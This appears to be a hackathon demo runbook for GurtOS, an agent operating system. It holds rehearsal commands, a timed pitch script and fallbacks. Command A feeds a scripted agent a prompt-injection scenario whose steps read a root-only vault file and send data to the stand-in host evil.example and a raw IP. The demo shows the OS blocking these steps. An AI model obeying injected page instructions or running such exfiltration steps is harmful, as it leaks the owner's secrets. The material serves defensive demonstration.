# The table demo: 3 minutes, with fallbacks

Sunday 10:30 AM to 12:30 PM PT. One run of the four moments on the laptop box, the approval on your phone, then
proof a judge can check on their own phone. Every number you say comes from `talking-points.md`.

Status of each step, checked Sun Oct 25 between 6:10 and 6:30 AM PT:

| Step | Checked how | Result |
|---|---|---|
| Laptop box health | Read-only API check | Running, remote address connected, 21 old tasks all done, 7 GB memory free |
| Booby-trapped page, spend approval, undo | The commands below, on a throwaway box with the same core | Blocked and logged; approval waited, then finished; undo removed the file |
| Pull the plug | try.gurtos.com, and every `./demo` run | The box came back and the long job resumed at step 3 |
| Replay | try.gurtos.com | Steps through every event with the files |
| Receipt check | A real receipt on gurtos.com/verify, then the same receipt with one letter changed | Passed; the changed copy failed the signature check |
| Attack it yourself | try.gurtos.com, with injection text typed by hand | 8 defences shown, plus the "Not covered, honestly" section |
| iPhone app approval | TestFlight build 5's code in the iPhone simulator, against a box on current main | Paired as owner and approved an $8 request with Face ID. A real phone has not yet received a push from a box |
| Mac app, Android app | Not paired with a box yet | Do not show them unless you try them first |

The four commands below have **not** been run on the laptop box itself, because that would change the demo box.
Rehearse each once before 10:00 AM (they add four small tasks to its list, which is fine).

## Before 10:00 AM

1. Laptop on its charger. `limactl list` shows the `box` VM running.
2. Browser, full screen, on `http://127.0.0.1:7700`. That is the box's own screen, so it acts as the owner.
3. Phone: the GurtOS app paired with the laptop box as the owner, notifications on, sound on. Then run command B
   once and approve it from the phone. This is the first time a real phone takes a push from a box, so do it early.
   If the push does not arrive, the phone can still answer: open the app and approve under Needs you.
4. A terminal with the commands below pasted in, one per line, ready to run with the up arrow. Never press
   **New task** on the screen: it starts a real Claude agent and spends model credit.
5. A second browser tab on `https://try.gurtos.com`, and its QR code on your phone's screen or on paper, for judges.
6. The main video downloaded to the laptop, in case the network goes: https://youtu.be/GRx8n4Ic_EY

### The commands

All four start a scripted agent through the box's own socket. No token, no model, no credit.

```sh
# A: the booby-trapped page (reads a page, then tries the vault, an outside host, and a raw connection)
limactl shell box -- sudo curl -s --unix-socket /var/lib/box/api.sock -X POST http://box/api/tasks -H 'content-type: application/json' -d '{"title":"Read a product page","worker":"fake","source":"demo","hosts":["example.com"],"prompt":"fetch https://example.com/ page.html\nsteal /etc/box/vault.env stolen.txt\nfetch https://evil.example/collect exfil.txt\nconnect 1.1.1.1:443 raw.txt"}'

# B: a $40 test purchase that asks first (reaches the screen and the phone)
limactl shell box -- sudo curl -s --unix-socket /var/lib/box/api.sock -X POST http://box/api/tasks -H 'content-type: application/json' -d '{"title":"Buy conference tickets","worker":"fake","source":"demo","prompt":"askspend 4000 Buy two conference tickets for $40.00? TEST payment, no real money.\nwrite receipt.md 2 tickets, $40.00 (test)"}'

# C: a task to undo
limactl shell box -- sudo curl -s --unix-socket /var/lib/box/api.sock -X POST http://box/api/tasks -H 'content-type: application/json' -d '{"title":"Draft the weekly report","worker":"fake","source":"demo","prompt":"write report.md Weekly report: draft by the agent\nappend report.md Second paragraph"}'

# D: a long job, then pull the plug (run the second line while the job runs)
limactl shell box -- sudo curl -s --unix-socket /var/lib/box/api.sock -X POST http://box/api/tasks -H 'content-type: application/json' -d '{"title":"A long job","worker":"fake","source":"demo","prompt":"append progress.txt step 1 done\nsleep 6\nappend progress.txt step 2 done\nsleep 6\nappend progress.txt step 3 done\nsleep 6\nappend progress.txt step 4 done\nsay Finished all four steps."}'
limactl shell box -- sudo systemctl kill -s KILL box
```

The kill stops the box service and every task in it at once, the same way the merge gate does. Systemd starts it
again after one second, and the box rebuilds every task from its log. For a judge who wants the whole machine to
lose power, `limactl stop -f box && limactl start box` does that, but it takes about a minute.

## The 3 minutes

**0:00 to 0:20. The problem.** "AI agents now do real work on our computers. But an operating system was built for
one person at a keyboard: an agent runs as you, with your files and your passwords, and nothing records or undoes
what it did. GurtOS is an operating system built for agents. Each task runs as its own Linux user, in its own copy of
the files, and never holds a key."

**0:20 to 0:55. The booby-trapped page.** Run **A**. "This agent reads a web page with hidden instructions: read the
vault, send it out." Open **Activity**: two red `net.blocked` lines, `evil.example:443` (the proxy) and `1.1.1.1:443`
(the firewall). Open the task: `stolen.txt` says `denied: EACCES`, because the vault is root-only and no task runs as
root. "It was fooled and still got nothing. The defence is the OS, not the model refusing."

**0:55 to 1:30. A pause for your OK.** Run **B**. The question appears under **Needs you** on the screen and on your
phone. Hand the phone to the judge, or approve with Face ID. The task finishes and writes `receipt.md`. "Other tasks
keep running while this one waits. The money is test money."

**1:30 to 1:50. Undo one task.** Run **C**. Open it, show `report.md` under Files it changed, press **Undo task**.
"Only this task's layer is gone. Every other task keeps its work. That is the filesystem doing it, not git."

**1:50 to 2:20. Pull the plug.** Run **D**, wait for step 2 in its row, then run the kill. The screen shows the box is
out of reach, then "Back after a restart". The long job carries on from the step it reached. "No step runs twice,
because the log on disk is the truth."

**2:20 to 2:45. Proof they can check.** Open task B, press **Replay**, step through it. Then **Receipts**, pick
"Buy conference tickets", choose **Receipt**, and let the judge scan the QR code. Their own browser checks the box's
signature and every link of the log's hash chain on gurtos.com/verify. "Change one letter and it fails." If they ask
about permissions: **Settings**, then an app's permissions, like on a phone.

**2:45 to 3:00. Close.** "Three editions: Server, Personal, and Business as a setting. Phone, Watch and Mac apps.
Open source under Apache-2.0. Scan this to attack a live GurtOS yourself." Show the try.gurtos.com QR code.

## If something goes wrong

| Problem | Do this |
|---|---|
| Venue Wi-Fi is down or slow | Turn on your phone's hotspot for the laptop. Commands B, C and D need no internet. In A, the `example.com` fetch fails; the blocked lines still appear. |
| The phone gets no notification | Open the GurtOS app and pull to refresh, or approve on the screen under **Needs you**. Push goes through the relay, so it needs internet on both sides. |
| The screen freezes or the box VM hangs | `limactl stop -f box && limactl start box` (about a minute). Meanwhile show the same moments on try.gurtos.com in the second tab. |
| try.gurtos.com says all demo computers are in use | Five run at once and free up after 20 idle minutes. Show it on the laptop's tab instead, or play the video. |
| A judge's try.gurtos.com tab says the computer is out of reach | That demo computer was reset. Reload the page for a new one. |
| A command prints an error | Check the VM with `limactl list`. If the box is fine, skip that moment and show it on try.gurtos.com. |
| Everything is down | Play the main video from the laptop's disk, then walk through the screenshots on calhacks.gurtos.com. |

## GurtOS Personal

Personal is a full Ubuntu desktop, so show it only if a judge asks, and only if its VM is booted and signed in
before judging starts. Otherwise show the Personal part of the main video and the Personal page on
calhacks.gurtos.com.
